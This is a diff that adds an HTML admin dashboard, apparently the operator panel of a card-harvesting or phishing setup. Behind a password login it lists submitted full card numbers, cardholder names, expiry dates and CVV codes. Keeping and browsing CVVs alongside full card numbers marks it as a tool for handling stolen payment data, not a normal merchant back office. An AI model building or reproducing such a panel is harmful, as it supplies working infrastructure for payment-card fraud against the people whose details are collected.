@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Card Information</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: #f4f6fa;
+    color: #202124;
+    padding: 20px;
+}
+
+.container {
+    max-width: 1000px;
+    margin: auto;
+}
+
+header {
+    background: #172554;
+    color: white;
+    padding: 25px;
+    border-radius: 12px;
+    margin-bottom: 20px;
+}
+
+header h1 {
+    font-size: 25px;
+}
+
+header p {
+    margin-top: 8px;
+    color: #cbd5e1;
+}
+
+.card {
+    background: white;
+    padding: 22px;
+    border-radius: 12px;
+    margin-bottom: 20px;
+    box-shadow: 0 2px 10px rgba(0,0,0,.05);
+}
+
+input {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #ddd;
+    border-radius: 7px;
+    margin: 12px 0;
+    font-size: 15px;
+}
+
+button {
+    padding: 12px 18px;
+    background: #2563eb;
+    color: white;
+    border: none;
+    border-radius: 7px;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: .6;
+}
+
+.logout {
+    background: #dc2626;
+    float: right;
+}
+
+.stats {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    margin-bottom: 20px;
+}
+
+.stat {
+    background: white;
+    padding: 22px;
+    border-radius: 12px;
+}
+
+.stat h2 {
+    font-size: 28px;
+    margin-top: 10px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 15px;
+}
+
+th, td {
+    padding: 13px;
+    border-bottom: 1px solid #eee;
+    text-align: left;
+}
+
+th {
+    background: #f8fafc;
+}
+
+#dashboard {
+    display: none;
+}
+
+#message {
+    margin-top: 12px;
+    font-size: 14px;
+}
+
+.table-wrap {
+    overflow-x: auto;
+}
+
+@media(max-width: 600px) {
+    body { padding: 12px; }
+    .stats { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<header>
+    <h1>Card Information</h1>
+    <p>Administrator Dashboard</p>
+</header>
+
+<section class="card" id="login">
+    <h2>Admin Login</h2>
+    <p>Sign in to manage Card submissions.</p>
+
+    <form id="loginForm">
+        <input
+            type="password"
+            id="password"
+            placeholder="Admin password"
+            required
+        >
+
+        <button type="submit" id="loginButton">
+            Login
+        </button>
+    </form>
+
+    <p id="message" role="status"></p>
+</section>
+
+<section id="dashboard">
+
+    <button class="logout" id="logoutButton">
+        Logout
+    </button>
+
+    <h2 style="margin-bottom:20px;">
+        Dashboard Overview
+    </h2>
+
+    <div class="stats">
+        <div class="stat">
+            <p>Total Submissions</p>
+            <h2 id="total">--</h2>
+        </div>
+
+        <div class="stat">
+            <p>Database Status</p>
+            <h2 id="databaseStatus">--</h2>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>Card Submissions</h2>
+
+        <input
+            type="search"
+            id="search"
+            placeholder="Search by name or valid_till ..."
+        >
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>card_number</th>
+                        <th>cardholders_name</th>
+                        <th>valid_till</th>
+                        <th>CVV</th>
+                    </tr>
+                </thead>
+
+                <tbody id="records">
+                </tbody>
+            </table>
+        </div>
+
+        <p id="recordMessage"></p>
+    </div>
+
+</section>
+
+</div>
+
+<script>
+const login = document.getElementById("login");
+const dashboard = document.getElementById("dashboard");
+const message = document.getElementById("message");
+const records = document.getElementById("records");
+
+let submissions = [];
+
+async function api(url, options = {}) {
+    const response = await fetch(url, {
+        ...options,
+        credentials: "same-origin",
+        headers: {
+            "Content-Type": "application/json",
+            ...options.headers
+        }
+    });
+
+    if (response.status === 401) {
+        throw new Error("Please log in again.");
+    }
+
+    const data = await response.json();
+
+    if (!response.ok) {
+        throw new Error(data.message || "Request failed.");
+    }
+
+    return data;
+}
+
+async function loadDashboard() {
+    const data = await api("/admin/submissions");
+
+    submissions = data.submissions || [];
+
+    document.getElementById("total").textContent =
+        submissions.length;
+
+    document.getElementById("databaseStatus").textContent =
+        "Connected";
+
+    renderRecords(submissions);
+
+    login.style.display = "none";
+    dashboard.style.display = "block";
+}
+
+function renderRecords(items) {
+    records.replaceChildren();
+
+    items.forEach(item => {
+        const row = document.createElement("tr");
+
+        [
+            item.card_number,
+            item.cardholders_name,
+            item.valid_till,
+            item.CVV
+        ].forEach(value => {
+            const cell = document.createElement("td");
+            cell.textContent = value || "";
+            row.appendChild(cell);
+        });
+
+        records.appendChild(row);
+    });
+
+    document.getElementById("recordMessage").textContent =
+        items.length ? "" : "No submissions found.";
+}
+
+document.getElementById("loginForm")
+.addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    const button = document.getElementById("loginButton");
+    button.disabled = true;
+    message.textContent = "Signing in...";
+
+    try {
+        await api("/admin/login", {
+            method: "POST",
+            body: JSON.stringify({
+                password: document.getElementById("password").value
+            })
+        });
+
+        await loadDashboard();
+
+    } catch(error) {
+        message.textContent = error.message;
+
+    } finally {
+        button.disabled = false;
+    }
+});
+
+document.getElementById("search")
+.addEventListener("input", function() {
+    const query = this.value.toLowerCase();
+
+    const filtered = submissions.filter(item =>
+        [
+            item.card_number,
+            item.cardholders_name,
+            item.valid_till,
+            item.cvv
+        ].some(value =>
+            String(value || "").toLowerCase().includes(query)
+        )
+    );
+
+    renderRecords(filtered);
+});
+
+document.getElementById("logoutButton")
+.addEventListener("click", async function() {
+    try {
+        await api("/admin/logout", {
+            method: "POST"
+        });
+
+        submissions = [];
+        dashboard.style.display = "none";
+        login.style.display = "block";
+        document.getElementById("password").value = "";
+        message.textContent = "You have logged out.";
+
+    } catch(error) {
+        alert(error.message);
+    }
+});
+</script>
+
+</body>
+</html>
